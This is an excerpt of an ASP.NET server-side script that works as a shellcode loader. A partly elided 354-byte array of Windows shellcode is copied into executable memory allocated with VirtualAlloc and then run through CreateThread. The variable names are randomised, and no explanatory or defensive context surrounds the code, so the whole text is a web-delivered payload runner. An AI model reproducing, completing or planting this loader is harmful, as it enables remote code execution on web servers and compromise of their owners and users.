...
<script runat="server">
    ...
    {
        byte[] rtttP = new byte[354] {
0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x31,0xd2,0x89,0xe5,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x31,
...
0x00,0x53,0xff,0xd5 };
        ...
        IntPtr a0DlRjmFFlCp = VirtualAlloc(IntPtr.Zero,(UIntPtr)rtttP.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(rtttP,0,a0DlRjmFFlCp,rtttP.Length);
        IntPtr bP4e7EcP = IntPtr.Zero;
        IntPtr m2tDgCDM4 = CreateThread(IntPtr.Zero,UIntPtr.Zero,a0DlRjmFFlCp,IntPtr.Zero,0,ref bP4e7EcP);
    }
</script>
